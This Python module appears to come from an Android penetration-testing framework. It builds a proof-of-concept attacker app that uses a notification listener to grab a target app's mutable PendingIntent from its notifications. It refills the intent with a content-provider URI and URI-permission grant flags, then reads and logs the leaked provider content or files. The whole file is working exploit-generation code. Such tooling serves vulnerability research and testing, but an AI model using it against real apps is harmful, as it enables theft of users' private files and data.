from modules.android.app.app import App
from modules.android.app.template import Template
from settings.logger import get_logger
from state.opt_bool import OptBool
from state.opt_enum import OptEnum
from state.opt_list import OptList
from state.opt_int import OptInt
from state.opt_str import OptStr
from state.options import option_state


log = get_logger(__name__)


class SherlockModule(App):

    def __init__(self):
        super().__init__()
        self._id = "mutable_pending_intent_notification"
        self._template = Template()


    def register_options(self):
        option_state.add_options([
            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", False]),
            OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
            OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
            OptStr("TARGET_PACKAGE", [True, "Target package name"]),
            OptStr("TARGET_CLASS", [False, "Target class name"]),
            OptStr("BASE_ACTION", [False, "Base intent action to intercept"]),
            OptInt("REQUEST_CODE", [True, "Pending intent request code"]),
            OptEnum("PROVIDER_TYPE", [True, "Content provider type (1: Share content, 2: Access to files)", 1, [1, 2]]),
            OptList("PUT_EXTRA", [False, "Intent extra data"]),
        ])
        self.update_option_status()


    def update_option_status(self):
        opts = option_state.get_all_options()
        stat_dict = {
            "via_deeplink": {
                "pos": ["deeplink_uri"],
                "neg": []
            },
            "is_exported": {
                "pos": ["via_deeplink", "target_class"],
                "neg": []
            },
        }
        super().update_option_status(stat_dict, opts)


    def execute(self):
        opts = self.get_options_value()

        is_exported = opts['IS_EXPORTED']
        via_deeplink = opts['VIA_DEEPLINK']
        deeplink_uri = opts['DEEPLINK_URI']
        provider_uri = opts['PROVIDER_URI']
        target_package = opts['TARGET_PACKAGE']
        target_class = opts['TARGET_CLASS']
        base_action = opts['BASE_ACTION']
        request_code = opts['REQUEST_CODE']
        provider_type = opts['PROVIDER_TYPE']
        put_extra = opts['PUT_EXTRA']

        exploit_activity_name = self.activity_name(self._id, target_package)
        leak_provider_activity_name = f'{self.activity_name(self._id, target_package)}LeakProvider'

        manifest = [
            self._template.build_manifest_component(
                "NotifListenerService",
                type="service",
                is_exported=True,
                permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE",
                intercept=True,
                action="android.service.notification.NotificationListenerService",
                category=[]
            ),
            self._template.build_manifest_component(
                leak_provider_activity_name,
                is_exported=True,
                intercept=True,
                action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else base_action
            ),
            self._template.build_manifest_component(
                self.activity_name(self._id, "enable.notification.access")
            ),
            self._template.build_manifest_component(
                exploit_activity_name
            )
        ]

        notif_access_activity = self._template.build_activity(
            name=self.activity_name(self._id, "enable.notification.access"),
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            bind_button=True,
            on_create=[
                self._template.build_intent(
                    set_action="android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"
                )
            ]
        )

        notif_listener_service = self._template.build_notif_listener_service(
            name="NotifListenerService",
            libs=[
                "android.app.PendingIntent",
                "android.content.ClipData",
                "android.content.Intent",
                "android.net.Uri",
                "android.util.Log",
                "android.service.notification.NotificationListenerService",
                "android.service.notification.StatusBarNotification"
            ],
            on_notif_posted=[
                f'if (!sbn.getPackageName().equals("{target_package}")) {{ return; }}',
                "PendingIntent pi = sbn.getNotification().contentIntent;",
                self._template.build_intent(
                    intent_var="hijack",
                    set_action="sherlock.poc.LEAK_PROVIDER" if base_action == "" else base_action,
                    set_clipdata=provider_uri,
                    set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                    start_activity=False
                ),
                f"try {{ pi.send(this, {request_code}, hijack, null, null); }} catch (PendingIntent.CanceledException e) {{ throw new RuntimeException(e); }}"
            ]
        )

        leak_provider_activity = self._template.build_activity(
            name=leak_provider_activity_name,
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.database.Cursor",
                "android.net.Uri",
                "android.os.Bundle",
                "android.util.Base64",
                "android.util.Log",
                "androidx.activity.result.ActivityResultLauncher",
                "androidx.activity.result.contract.ActivityResultContracts",
                "androidx.appcompat.app.AppCompatActivity",
                "java.io.BufferedReader",
                "java.io.FileNotFoundException",
                "java.io.IOException",
                "java.io.InputStream",
                "java.io.InputStreamReader",
                "java.nio.charset.StandardCharsets"
            ],
            on_create=[
                "Uri uri = getIntent().getClipData().getItemAt(0).getUri();",
                self._template.resolve_content(provider_type)
            ]
        )

        exploit_activity = self._template.build_activity(
            name=exploit_activity_name,
            libs=[
                "android.content.Context",
                "android.content.Intent",
                "android.net.Uri",
                "android.os.Bundle",
                "androidx.appcompat.app.AppCompatActivity"
            ],
            bind_button=True,
            on_create=[self._template.build_intent(
                set_action="android.intent.action.VIEW" if via_deeplink else None,
                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
                set_classname=[target_package, target_class] if not via_deeplink else []
            )]
        )

        component = [
            {
                "name": f"{self.activity_name(self._id, 'enable.notification.access')}.java",
                "content": notif_access_activity 
            },
            {
                "name": "NotifListenerService.java",
                "content": notif_listener_service
            },
            {
                "name": f"{leak_provider_activity_name}.java",
                "content": leak_provider_activity 
            },
            {
                "name": f"{exploit_activity_name}.java",
                "content": exploit_activity 
            }
        ]

        button_layout = [
            self._template.button_layout(self._id, "enable.notification.access"),
            self._template.button_layout(self._id, target_package)
        ]

        bind_button = [
            self._template.bind_button(self._id, "enable.notification.access"),
            self._template.bind_button(self._id, target_package)
        ]

        if not is_exported:
            manifest.pop()
            component.pop()
            button_layout.pop()
            bind_button.pop()

        app = {
            "manifest": manifest,
            "layout": button_layout,
            "bind_button": bind_button,
            "component": component
        }

        build_app = self.build(app)
        if not build_app:
            log.error("Module failed to execute, terminating module..\n")
            return
        
        self.check_component_log(opts)

        self.check_logcat()